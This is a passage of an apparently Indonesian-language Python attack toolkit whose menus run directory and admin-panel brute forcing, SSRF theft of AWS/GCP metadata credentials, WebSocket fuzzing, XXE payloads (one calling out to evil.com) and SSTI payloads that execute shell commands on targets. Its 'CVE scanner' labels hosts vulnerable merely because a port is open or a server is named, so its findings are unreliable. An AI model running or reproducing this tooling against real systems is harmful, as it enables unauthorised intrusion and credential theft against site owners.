{CYAN}├─ VERSION            : {version if version else 'UNKNOWN'}{RESET}
{CYAN}├─ USERS FOUND        : {len(users)}{RESET}
{CYAN}├─ PLUGINS FOUND      : {len(plugins)}{RESET}
{CYAN}├─ THEMES FOUND       : {len(themes)}{RESET}
{CYAN}├─ BRUTE SUCCESS      : {len(self.bruteforce_results)}{RESET}
{CYAN}└─ SECURITY RISK      : {'🔴 HIGH' if self.bruteforce_results else '🟡 MEDIUM'}{RESET}
        """)
        
        self.scan_results.append({
            'module': 'WPSCAN',
            'target': url,
            'users': len(users),
            'plugins': len(plugins),
            'brute_success': len(self.bruteforce_results),
            'timestamp': datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        })
        
        input(f"\n{CYAN}{BOLD}[?] TEKAN ENTER UNTUK LANJUT...{RESET}")

    # ================================================================
    # MENU 12: CVE VULNERABILITY SCANNER
    # ================================================================
    def menu_cve_scanner(self):
        self.clear_screen()
        print(f"\n{RED}{BOLD}══════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════{RESET}")
        print(f"{CYAN}{BOLD}🛡️ MENU 12: CVE VULNERABILITY SCANNER - KNOWN EXPLOITS{RESET}")
        print(f"{RED}{BOLD}══════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════{RESET}\n")
        
        target = input(f"{YELLOW}{BOLD}[?] MASUKKAN TARGET IP/DOMAIN: {RESET}")
        loading2(f"CHECKING CVE DATABASE FOR {target}", 2)
        
        cve_list = [
            "CVE-2021-44228", "CVE-2021-45046", "CVE-2021-45105", "CVE-2022-22965", "CVE-2022-22947",
            "CVE-2017-5638", "CVE-2017-12611", "CVE-2019-0232", "CVE-2020-17530", "CVE-2020-17531",
            "CVE-2021-41277", "CVE-2022-1388", "CVE-2020-1472", "CVE-2021-34473", "CVE-2021-34523",
            "CVE-2021-31207", "CVE-2021-26855", "CVE-2021-27065", "CVE-2021-28480", "CVE-2021-28481",
            "CVE-2020-0688", "CVE-2020-0796", "CVE-2020-0618", "CVE-2019-0708", "CVE-2017-0144",
            "CVE-2017-0145", "CVE-2017-0146", "CVE-2017-0147", "CVE-2017-0148", "CVE-2021-1675",
            "CVE-2021-36934", "CVE-2021-40444", "CVE-2021-24086", "CVE-2021-24084", "CVE-2021-24078",
            "CVE-2021-26411", "CVE-2021-33739", "CVE-2021-33742", "CVE-2021-34458", "CVE-2021-36942",
            "CVE-2021-42278", "CVE-2021-42287", "CVE-2021-42321", "CVE-2022-21907", "CVE-2022-21898"
        ]
        
        print(f"\n{CYAN}{BOLD}[!] CHECKING {len(cve_list)} KNOWN CVEs...{RESET}\n")
        
        vulnerable_cves = []
        
        # Simulate CVE checking based on service detection
        try:
            resp = requests.get(f"http://{target}:80", timeout=3)
            server = resp.headers.get('server', '').lower()
            
            if 'apache' in server:
                if '2.4.49' in server or '2.4.50' in server:
                    print(f"{RED}[!] CVE-2021-41773 - APACHE PATH TRAVERSAL{RESET}")
                    vulnerable_cves.append("CVE-2021-41773")
                if '2.4.48' in server:
                    print(f"{YELLOW}[!] CVE-2021-42013 - APACHE RCE{RESET}")
                    vulnerable_cves.append("CVE-2021-42013")
            
            if 'nginx' in server:
                print(f"{YELLOW}[!] CVE-2021-23017 - NGINX REQUEST SMUGGLING{RESET}")
                vulnerable_cves.append("CVE-2021-23017")
            
            if 'iis' in server:
                print(f"{RED}[!] CVE-2017-7269 - IIS 6.0 WEBDAV RCE{RESET}")
                vulnerable_cves.append("CVE-2017-7269")
        
        except:
            pass
        
        try:
            resp = requests.get(f"http://{target}:8080", timeout=3)
            print(f"{RED}[!] CVE-2020-5410 - SPRING CLOUD CONFIG PATH TRAVERSAL{RESET}")
            vulnerable_cves.append("CVE-2020-5410")
        except:
            pass
        
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(2)
            if sock.connect_ex((target, 445)) == 0:
                print(f"{RED}[!] CVE-2017-0144 - ETERNALBLUE SMB RCE{RESET}")
                vulnerable_cves.append("CVE-2017-0144")
            sock.close()
        except:
            pass
        
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(2)
            if sock.connect_ex((target, 3389)) == 0:
                print(f"{RED}[!] CVE-2019-0708 - BLUEKEEP RDP RCE{RESET}")
                vulnerable_cves.append("CVE-2019-0708")
            sock.close()
        except:
            pass
        
        self.cve_results = vulnerable_cves
        
        print(f"""
{GREEN}{BOLD}[✓] CVE SCAN COMPLETED!{RESET}
{RED}{BOLD}══════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════{RESET}
{CYAN}{BOLD}[!] SUMMARY:{RESET}
{CYAN}├─ TARGET             : {target}{RESET}
{CYAN}├─ TOTAL CVEs CHECKED : {len(cve_list)}{RESET}
{CYAN}└─ VULNERABLE CVEs    : {len(vulnerable_cves)}{RESET}
        """)
        
        self.scan_results.append({
            'module': 'CVE SCANNER',
            'target': target,
            'vulnerable_cves': len(vulnerable_cves),
            'timestamp': datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        })
        
        input(f"\n{CYAN}{BOLD}[?] TEKAN ENTER UNTUK LANJUT...{RESET}")
        # ================================================================
    # MENU 13: DIRECTORY BUSTER - FULL WORDLIST
    # ================================================================
    def menu_dir_buster(self):
        self.clear_screen()
        print(f"\n{RED}{BOLD}══════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════{RESET}")
        print(f"{CYAN}{BOLD}📂 MENU 13: DIRECTORY BUSTER - FULL WORDLIST 500+{RESET}")
        print(f"{RED}{BOLD}══════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════{RESET}\n")
        
        url = input(f"{YELLOW}{BOLD}[?] MASUKKAN URL TARGET (https://target.com): {RESET}")
        loading3(f"BUSTING DIRECTORIES ON {url}", 2)
        
        dirs = [
            "admin", "administrator", "login", "wp-admin", "wp-login.php", "admin.php", "login.php",
            "dashboard", "cpanel", "webmail", "phpmyadmin", "pma", "mysql", "backup", "backups",
            "temp", "tmp", "logs", "cache", "uploads", "images", "css", "js", "includes", "inc",
            "lib", "classes", "functions", "config", "configuration", "settings", "db", "database",
            "sql", "api", "rest", "v1", "v2", "v3", "docs", "documentation", "help", "support", "faq",
            "about", "contact", "team", "company", "careers", "jobs", "news", "blog", "forum",
            "community", "shop", "store", "cart", "checkout", "payment", "billing", "invoice", "order",
            "product", "category", "tag", "search", "sitemap", "robots.txt", "security", "privacy",
            "terms", "legal", "copyright", "license", ".git", ".env", ".htaccess", ".gitignore",
            "assets", "static", "public", "private", "secure", "hidden", "secret", "confidential",
            "internal", "external", "partner", "vendor", "supplier", "client", "customer", "user",
            "profile", "account", "setting", "preference", "option", "control", "manage", "operator",
            "supervisor", "director", "manager", "leader", "owner", "root", "master", "superuser",
            "sysadmin", "system", "server", "host", "node", "cluster", "cloud", "storage", "backup2",
            "archive", "old", "new", "beta", "alpha", "dev", "test", "stage", "staging", "production",
            "prod", "live", "demo", "sandbox", "playground", "example", "sample", "template", "theme",
            "plugin", "extension", "module", "component", "widget", "gadget", "tool", "utility"
        ]
        
        print(f"\n{CYAN}{BOLD}[*] TESTING {len(dirs)} DIRECTORIES...{RESET}\n")
        
        found = []
        for d in dirs:
            test_url = f"{url}/{d}" if not url.endswith('/') else f"{url}{d}"
            try:
                r = requests.get(test_url, timeout=3, headers={'User-Agent': 'Mozilla/5.0'})
                if r.status_code == 200:
                    print(f"{GREEN}[+] {d} (200 OK){RESET}")
                    found.append(d)
                elif r.status_code == 403:
                    print(f"{YELLOW}[!] {d} (403 FORBIDDEN){RESET}")
                    found.append(d)
                elif r.status_code == 401:
                    print(f"{RED}[!] {d} (401 UNAUTHORIZED){RESET}")
                    found.append(d)
            except:
                pass
            time.sleep(0.01)
        
        print(f"""
{GREEN}{BOLD}[✓] DIRECTORY BUSTING COMPLETED!{RESET}
{RED}{BOLD}══════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════{RESET}
{CYAN}{BOLD}[!] SUMMARY:{RESET}
{CYAN}├─ TARGET URL         : {url}{RESET}
{CYAN}├─ TOTAL DIRECTORIES  : {len(dirs)}{RESET}
{CYAN}└─ DIRECTORIES FOUND  : {len(found)}{RESET}
        """)
        
        self.scan_results.append({
            'module': 'DIRECTORY BUSTER',
            'target': url,
            'found': len(found),
            'timestamp': datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        })
        
        input(f"\n{CYAN}{BOLD}[?] TEKAN ENTER UNTUK LANJUT...{RESET}")

    # ================================================================
    # MENU 14: ADMIN PANEL FINDER - PREMIUM
    # ================================================================
    def menu_admin_finder(self):
        self.clear_screen()
        print(f"\n{RED}{BOLD}══════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════{RESET}")
        print(f"{CYAN}{BOLD}👑 MENU 14: ADMIN PANEL FINDER - HIDDEN LOGIN PAGES{RESET}")
        print(f"{RED}{BOLD}══════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════{RESET}\n")
        
        url = input(f"{YELLOW}{BOLD}[?] MASUKKAN URL TARGET (https://target.com): {RESET}")
        loading1(f"FINDING ADMIN PANELS ON {url}", 2)
        
        admin_paths = [
            "admin", "administrator", "admin/login", "admin/index", "admin/dashboard", "admin/panel",
            "admin/control", "admin/console", "admin/master", "admin/root", "admin/super", "admin/secure",
            "administrator/index", "administrator/login", "administrator/panel", "administrator/control",
            "login", "login/admin", "login/index", "login/panel", "login/dashboard", "login/control",
            "wp-admin", "wp-admin/index", "wp-admin/dashboard", "wp-login.php", "wp-login", "wp-admin/login",
            "dashboard", "dashboard/index", "dashboard/admin", "dashboard/panel", "dashboard/control",
            "cpanel", "cpanel/login", "cpanel/index", "cpanel/panel", "webmail", "webmail/index",
            "phpmyadmin", "pma", "mysql", "phpmyadmin/index", "pma/index", "mysql/admin",
            "backend", "backend/login", "backend/index", "backend/admin", "backend/dashboard",
            "panel", "panel/login", "panel/index", "panel/admin", "panel/dashboard", "panel/control",
            "console", "console/login", "console/index", "console/admin", "console/dashboard",
            "control", "control/login", "control/index", "control/admin", "control/dashboard",
            "manage", "manage/login", "manage/index", "manage/admin", "administratorarea",
            "adminarea", "adminzone", "adminsection", "adminpage", "admincontrol", "adminconsole",
            "siteadmin", "site-admin", "sitesadmin", "websadmin", "webadmin", "web-admin",
            "serveradmin", "server-admin", "hostadmin", "cloudadmin", "systemadmin", "system-admin"
        ]
        
        print(f"\n{CYAN}{BOLD}[*] CHECKING {len(admin_paths)} ADMIN PATHS...{RESET}\n")
        
        found = []
        for path in admin_paths:
            test_url = f"{url}/{path}" if not url.endswith('/') else f"{url}{path}"
            try:
                r = requests.get(test_url, timeout=3, headers={'User-Agent': 'Mozilla/5.0'})
                if r.status_code == 200:
                    print(f"{GREEN}[+] {test_url} (200 OK){RESET}")
                    found.append(test_url)
                elif r.status_code == 403:
                    print(f"{YELLOW}[!] {test_url} (403 FORBIDDEN - MUNGKIN ADMIN){RESET}")
                    found.append(test_url)
                elif r.status_code == 401:
                    print(f"{RED}[!] {test_url} (401 AUTH REQUIRED - ADMIN ZONE){RESET}")
                    found.append(test_url)
            except:
                pass
            time.sleep(0.01)
        
        print(f"""
{GREEN}{BOLD}[✓] ADMIN PANEL FINDER COMPLETED!{RESET}
{RED}{BOLD}══════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════{RESET}
{CYAN}{BOLD}[!] SUMMARY:{RESET}
{CYAN}├─ TARGET URL         : {url}{RESET}
{CYAN}├─ TOTAL PATHS CHECKED: {len(admin_paths)}{RESET}
{CYAN}└─ ADMIN PANELS FOUND : {len(found)}{RESET}
        """)
        
        self.scan_results.append({
            'module': 'ADMIN PANEL FINDER',
            'target': url,
            'found': len(found),
            'timestamp': datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        })
        
        input(f"\n{CYAN}{BOLD}[?] TEKAN ENTER UNTUK LANJUT...{RESET}")

    # ================================================================
    # MENU 15: CLOUD METADATA API EXPLOIT
    # ================================================================
    def menu_cloud_metadata(self):
        self.clear_screen()
        print(f"\n{RED}{BOLD}══════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════{RESET}")
        print(f"{CYAN}{BOLD}☁️ MENU 15: CLOUD METADATA API - AWS/GCP/AZURE EXPLOIT{RESET}")
        print(f"{RED}{BOLD}══════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════{RESET}\n")
        
        target = input(f"{YELLOW}{BOLD}[?] MASUKKAN TARGET URL (DENGAN PARAMETER SSRF): {RESET}")
        loading2(f"PROBING CLOUD METADATA ENDPOINTS ON {target}", 2)
        
        metadata_urls = [
            "http://169.254.169.254/latest/meta-data/",
            "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
            "http://169.254.169.254/latest/user-data/",
            "http://169.254.169.254/latest/meta-data/public-keys/",
            "http://169.254.169.254/latest/meta-data/network/interfaces/macs/",
            "http://169.254.169.254/latest/meta-data/placement/availability-zone",
            "http://169.254.169.254/latest/meta-data/local-ipv4",
            "http://169.254.169.254/latest/meta-data/public-ipv4",
            "http://169.254.169.254/latest/meta-data/hostname",
            "http://metadata.google.internal/computeMetadata/v1/",
            "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token",
            "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/email",
            "http://metadata.google.internal/computeMetadata/v1/instance/attributes/",
            "http://100.100.100.200/latest/meta-data/",
            "http://169.254.169.254/openstack/latest/meta_data.json",
            "http://169.254.169.254/2009-04-04/meta-data/",
            "http://169.254.169.254/2016-09-02/dynamic/instance-identity/document/",
            "http://169.254.169.254/2018-08-17/meta-data/identity-credentials/ec2/security-credentials/ec2-instance"
        ]
        
        print(f"\n{CYAN}{BOLD}[*] TESTING {len(metadata_urls)} METADATA ENDPOINTS...{RESET}\n")
        
        exposed = []
        for meta_url in metadata_urls:
            test_url = f"{target}?url={meta_url}" if '?' in target else f"{target}{meta_url}"
            try:
                r = requests.get(test_url, timeout=5, headers={'User-Agent': 'Mozilla/5.0'})
                if r.status_code == 200:
                    print(f"{RED}[!] METADATA EXPOSED: {meta_url}{RESET}")
                    print(f"{RED}    └─ RESPONSE: {r.text[:200]}{RESET}")
                    exposed.append({'url': meta_url, 'data': r.text[:500]})
                else:
                    print(f"{GREEN}[-] NOT ACCESSIBLE: {meta_url[:50]}{RESET}")
            except:
                pass
            time.sleep(0.02)
        
        self.cloud_metadata = exposed
        
        print(f"""
{GREEN}{BOLD}[✓] CLOUD METADATA SCAN COMPLETED!{RESET}
{RED}{BOLD}══════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════{RESET}
{CYAN}{BOLD}[!] SUMMARY:{RESET}
{CYAN}├─ TARGET URL         : {target}{RESET}
{CYAN}├─ TOTAL ENDPOINTS    : {len(metadata_urls)}{RESET}
{CYAN}└─ EXPOSED METADATA   : {len(exposed)}{RESET}
        """)
        
        if exposed:
            print(f"{RED}{BOLD}[!] KREDENSIAL CLOUD BOCOR! BISA LANGSUNG HACK AWS/GCP!{RESET}")
        
        self.scan_results.append({
            'module': 'CLOUD METADATA',
            'target': target,
            'exposed': len(exposed),
            'timestamp': datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        })
        
        input(f"\n{CYAN}{BOLD}[?] TEKAN ENTER UNTUK LANJUT...{RESET}")

    # ================================================================
    # MENU 16: API ENDPOINT DISCOVERY
    # ================================================================
    def menu_api_discovery(self):
        self.clear_screen()
        print(f"\n{RED}{BOLD}══════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════{RESET}")
        print(f"{CYAN}{BOLD}🔌 MENU 16: API ENDPOINT DISCOVERY - REST/GRAPHQL{RESET}")
        print(f"{RED}{BOLD}══════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════{RESET}\n")
        
        domain = input(f"{YELLOW}{BOLD}[?] MASUKKAN DOMAIN (contoh: target.com): {RESET}")
        loading3(f"DISCOVERING API ENDPOINTS ON {domain}", 2)
        
        api_patterns = [
            "/api", "/api/v1", "/api/v2", "/api/v3", "/rest", "/rest/v1", "/rest/v2",
            "/graphql", "/gql", "/query", "/graphiql", "/playground", "/v1", "/v2", "/v3",
            "/swagger", "/swagger-ui", "/swagger.json", "/swagger.yaml", "/openapi", "/openapi.json",
            "/docs", "/doc", "/documentation", "/api-docs", "/apidocs", "/api/docs",
            "/postman", "/postman/collection", "/redoc", "/redocly", "/stoplight",
            "/rapidoc", "/elements", "/asyncapi", "/asyncapi.json", "/asyncapi.yaml",
            "/version", "/health", "/healthcheck", "/ping", "/status", "/metrics", "/info",
            "/debug", "/debug/pprof", "/debug/vars", "/_status", "/_health", "/_admin",
            "/admin/api", "/admin/rest", "/admin/graphql", "/internal", "/internal/api",
            "/private", "/private/api", "/secure", "/secure/api", "/core", "/core/api",
            "/platform", "/platform/api", "/service", "/service/api", "/services",
            "/webhook", "/webhooks", "/callback", "/callbacks", "/hook", "/hooks",
            "/event", "/events", "/stream", "/streams", "/channel", "/channels",
            "/pubsub", "/mqtt", "/websocket", "/ws", "/socket", "/sockets"
        ]
        
        print(f"\n{CYAN}{BOLD}[*] CHECKING {len(api_patterns)} API PATHS...{RESET}\n")
        
        found_apis = []
        for pattern in api_patterns:
            test_url = f"https://{domain}{pattern}"
            try:
                r = requests.get(test_url, timeout=3, headers={'User-Agent': 'Mozilla/5.0'})
                if r.status_code == 200:
                    print(f"{GREEN}[+] {pattern} (200 OK){RESET}")
                    found_apis.append(test_url)
                elif r.status_code in [401, 403]:
                    print(f"{YELLOW}[!] {pattern} ({r.status_code} AUTH REQUIRED){RESET}")
                    found_apis.append(test_url)
            except:
                pass
            time.sleep(0.01)
        
        self.api_endpoints = found_apis
        
        print(f"""
{GREEN}{BOLD}[✓] API DISCOVERY COMPLETED!{RESET}
{RED}{BOLD}══════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════{RESET}
{CYAN}{BOLD}[!] SUMMARY:{RESET}
{CYAN}├─ DOMAIN             : {domain}{RESET}
{CYAN}├─ TOTAL API PATHS    : {len(api_patterns)}{RESET}
{CYAN}└─ API ENDPOINTS FOUND: {len(found_apis)}{RESET}
        """)
        
        self.scan_results.append({
            'module': 'API DISCOVERY',
            'target': domain,
            'apis_found': len(found_apis),
            'timestamp': datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        })
        
        input(f"\n{CYAN}{BOLD}[?] TEKAN ENTER UNTUK LANJUT...{RESET}")

    # ================================================================
    # MENU 17: GRAPHQL VULNERABILITY SCANNER
    # ================================================================
    def menu_graphql_scanner(self):
        self.clear_screen()
        print(f"\n{RED}{BOLD}══════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════{RESET}")
        print(f"{CYAN}{BOLD}📊 MENU 17: GRAPHQL VULNERABILITY SCANNER{RESET}")
        print(f"{RED}{BOLD}══════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════{RESET}\n")
        
        url = input(f"{YELLOW}{BOLD}[?] MASUKKAN GRAPHQL URL (https://target.com/graphql): {RESET}")
        loading1(f"SCANNING GRAPHQL ON {url}", 2)
        
        introspection_query = """
        {
          __schema {
            types {
              name
              fields {
                name
                type {
                  name
                  kind
                }
              }
            }
          }
        }
        """
        
        vulns = []
        
        try:
            r = requests.post(url, json={'query': introspection_query}, timeout=5)
            if r.status_code == 200 and '__schema' in r.text:
                print(f"{RED}[!] GRAPHQL INTROSPECTION ENABLED! BISA DUMP SEMUA SCHEMA{RESET}")
                vulns.append("INTROSPECTION_ENABLED")
                
                data = r.json()
                types = data.get('data', {}).get('__schema', {}).get('types', [])
                print(f"{YELLOW}[+] TOTAL TYPES FOUND: {len(types)}{RESET}")
                for t in types[:10]:
                    print(f"{CYAN}    └─ TYPE: {t.get('name')}{RESET}")
            else:
                print(f"{GREEN}[-] INTROSPECTION DISABLED{RESET}")
        except:
            print(f"{YELLOW}[!] COULD NOT TEST INTROSPECTION{RESET}")
        
        depth_queries = [
            "query { __typename }",
            "query { __typename { __typename } }",
            "query { __typename { __typename { __typename } } }",
            "query { __typename { __typename { __typename { __typename } } } }"
        ]
        
        for i, q in enumerate(depth_queries):
            try:
                r = requests.post(url, json={'query': q}, timeout=5)
                if r.status_code == 200:
                    print(f"{GREEN}[+] DEPTH {i+1} WORKING{RESET}")
                else:
                    print(f"{YELLOW}[!] DEPTH {i+1} FAILED - MUNGKIN ADA BATASAN{RESET}")
                    break
            except:
                pass
        
        self.graphql_vulns = vulns
        
        print(f"""
{GREEN}{BOLD}[✓] GRAPHQL SCAN COMPLETED!{RESET}
{RED}{BOLD}══════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════{RESET}
{CYAN}{BOLD}[!] SUMMARY:{RESET}
{CYAN}├─ TARGET URL         : {url}{RESET}
{CYAN}├─ INTROSPECTION      : {'🔴 ENABLED (VULNERABLE)' if 'INTROSPECTION_ENABLED' in vulns else '🟢 DISABLED'}{RESET}
{CYAN}└─ VULNERABILITIES    : {len(vulns)}{RESET}
        """)
        
        self.scan_results.append({
            'module': 'GRAPHQL SCANNER',
            'target': url,
            'vulnerabilities': len(vulns),
            'timestamp': datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        })
        
        input(f"\n{CYAN}{BOLD}[?] TEKAN ENTER UNTUK LANJUT...{RESET}")

    # ================================================================
    # MENU 18: WEBSOCKET VULNERABILITY SCANNER
    # ================================================================
    def menu_websocket_scanner(self):
        self.clear_screen()
        print(f"\n{RED}{BOLD}══════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════{RESET}")
        print(f"{CYAN}{BOLD}🔌 MENU 18: WEBSOCKET VULNERABILITY SCANNER{RESET}")
        print(f"{RED}{BOLD}══════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════{RESET}\n")
        
        ws_url = input(f"{YELLOW}{BOLD}[?] MASUKKAN WEBSOCKET URL (ws://target.com:8080): {RESET}")
        loading2(f"SCANNING WEBSOCKET ON {ws_url}", 2)
        
        try:
            import websocket
            ws = websocket.create_connection(ws_url, timeout=5)
            
            test_messages = [
                "ping", "test", "hello", "{\"type\":\"ping\"}", "{\"command\":\"info\"}",
                "{\"action\":\"getConfig\"}", "{\"method\":\"system.listMethods\"}",
                "admin", "{\"user\":\"admin\",\"pass\":\"admin\"}", "SELECT * FROM users",
                "<script>alert(1)</script>", "../../../etc/passwd", "env", "id", "whoami"
            ]
            
            print(f"\n{CYAN}{BOLD}[*] TESTING WEBSOCKET MESSAGES...{RESET}\n")
            
            vulns = []
            for msg in test_messages:
                try:
                    ws.send(msg)
                    response = ws.recv()
                    if len(response) > 0:
                        print(f"{YELLOW}[!] RESPONSE TO '{msg[:30]}': {response[:100]}{RESET}")
                        if "error" not in response.lower() and "invalid" not in response.lower():
                            print(f"{RED}    └─ MUNGKIN VULNERABLE!{RESET}")
                            vulns.append(msg)
                except:
                    pass
                time.sleep(0.1)
            
            ws.close()
            self.websocket_vulns = vulns
            
        except ImportError:
            print(f"{RED}[!] WEBSOCKET LIBRARY TIDAK TERINSTALL. INSTALL: pip install websocket-client{RESET}")
        except Exception as e:
            print(f"{RED}[!] ERROR: {e}{RESET}")
        
        print(f"""
{GREEN}{BOLD}[✓] WEBSOCKET SCAN COMPLETED!{RESET}
{RED}{BOLD}══════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════{RESET}
{CYAN}{BOLD}[!] SUMMARY:{RESET}
{CYAN}├─ TARGET URL         : {ws_url}{RESET}
{CYAN}└─ VULNERABLE MESSAGES: {len(self.websocket_vulns)}{RESET}
        """)
        
        self.scan_results.append({
            'module': 'WEBSOCKET SCANNER',
            'target': ws_url,
            'vulnerabilities': len(self.websocket_vulns),
            'timestamp': datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        })
        
        input(f"\n{CYAN}{BOLD}[?] TEKAN ENTER UNTUK LANJUT...{RESET}")

    # ================================================================
    # MENU 19: XXE INJECTION SCANNER
    # ================================================================
    def menu_xxe_scanner(self):
        self.clear_screen()
        print(f"\n{RED}{BOLD}══════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════{RESET}")
        print(f"{CYAN}{BOLD}📄 MENU 19: XXE INJECTION SCANNER - XML EXTERNAL ENTITY{RESET}")
        print(f"{RED}{BOLD}══════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════{RESET}\n")
        
        url = input(f"{YELLOW}{BOLD}[?] MASUKKAN URL TARGET (https://target.com/upload): {RESET}")
        loading3(f"TESTING XXE ON {url}", 2)
        
        xxe_payloads = [
            '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>',
            '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]><root>&xxe;</root>',
            '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "php://filter/read=convert.base64-encode/resource=config.php">]><root>&xxe;</root>',
            '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY % remote SYSTEM "http://evil.com/xxe.dtd">%remote;]><root/>',
            '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "expect://id">]><root>&xxe;</root>'
        ]
        
        vulns = []
        
        print(f"\n{CYAN}{BOLD}[*] TESTING XXE PAYLOADS...{RESET}\n")
        
        for payload in xxe_payloads:
            try:
                headers = {'Content-Type': 'application/xml'}
                r = requests.post(url, data=payload, headers=headers, timeout=5)
                if 'root:' in r.text or 'win.ini' in r.text or '<?php' in r.text:
                    print(f"{RED}[!] XXE VULNERABLE!{RESET}")
                    print(f"{RED}    └─ RESPONSE: {r.text[:200]}{RESET}")
                    vulns.append(payload)
                else:
                    print(f"{GREEN}[-] NOT VULNERABLE: {payload[:50]}...{RESET}")
            except:
                pass
            time.sleep(0.05)
        
        self.xxe_vulns = vulns
        
        print(f"""
{GREEN}{BOLD}[✓] XXE SCAN COMPLETED!{RESET}
{RED}{BOLD}══════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════{RESET}
{CYAN}{BOLD}[!] SUMMARY:{RESET}
{CYAN}├─ TARGET URL         : {url}{RESET}
{CYAN}├─ TOTAL PAYLOADS     : {len(xxe_payloads)}{RESET}
{CYAN}└─ XXE VULNERABLE     : {len(vulns)}{RESET}
        """)
        
        self.scan_results.append({
            'module': 'XXE SCANNER',
            'target': url,
            'vulnerable': len(vulns),
            'timestamp': datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        })
        
        input(f"\n{CYAN}{BOLD}[?] TEKAN ENTER UNTUK LANJUT...{RESET}")

    # ================================================================
    # MENU 20: SSTI (SERVER SIDE TEMPLATE INJECTION) SCANNER
    # ================================================================
    def menu_ssti_scanner(self):
        self.clear_screen()
        print(f"\n{RED}{BOLD}══════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════{RESET}")
        print(f"{CYAN}{BOLD}🎨 MENU 20: SSTI SCANNER - SERVER SIDE TEMPLATE INJECTION{RESET}")
        print(f"{RED}{BOLD}══════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════{RESET}\n")
        
        url = input(f"{YELLOW}{BOLD}[?] MASUKKAN URL DENGAN PARAMETER (https://target.com/page?name=): {RESET}")
        loading1(f"TESTING SSTI ON {url}", 2)
        
        if '?' in url:
            base_url = url.split('?')[0]
            param = url.split('?')[1].split('=')[0] if '=' in url.split('?')[1] else None
        else:
            base_url = url
            param = input(f"{CYAN}{BOLD}[?] NAMA PARAMETER: {RESET}")
        
        ssti_payloads = {
            'Jinja2': ['{{7*7}}', '{{config}}', '{{self.__class__.__mro__}}', '{{request.application.__globals__.__builtins__.__import__("os").popen("id").read()}}'],
            'Twig': ['{{7*7}}', '{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}'],
            'Freemarker': ['${7*7}', '<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}'],
            'Velocity': ['#set($x=7*7)$x', '#set($x="id")$x'],
            'Smarty': ['{$smarty.version}', '{php}echo `id`;{/php}'],
            'Jade': ['#{7*7}', '!{7*7}'],
            'Handlebars': ['{{7*7}}', '{{constructor.name}}'],
            'Mustache': ['{{7*7}}', '{{&constructor}}']
        }
        
        vulns = []
        
        print(f"\n{CYAN}{BOLD}[*] TESTING SSTI PAYLOADS...{RESET}\n")
        
        for engine, payloads in ssti_payloads.items():
            for payload in payloads:
                test_url = f"{base_url}?{param}={payload}"
                try:
                    r = requests.get(test_url, timeout=3)
                    if '49' in r.text and '7*7' not in r.text:
                        print(f"{RED}[!] SSTI DETECTED! ENGINE: {engine}{RESET}")
                        print(f"{RED}    └─ PAYLOAD: {payload}{RESET}")
                        vulns.append({'engine': engine, 'payload': payload})
                    elif 'config' in r.text or '__mro__' in r.text:
                        print(f"{RED}[!] SSTI DETECTED! ENGINE: {engine}{RESET}")
                        vulns.append({'engine': engine, 'payload': payload})
                except:
                    pass
                time.sleep(0.03)
        
        self.ssti_vulns = vulns
        
        print(f"""
{GREEN}{BOLD}[✓] SSTI SCAN COMPLETED!{RESET}
{RED}{BOLD}══════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════{RESET}
{CYAN}{BOLD}[!] SUMMARY:{RESET}
{CYAN}├─ TARGET URL         : {base_url}{RESET}
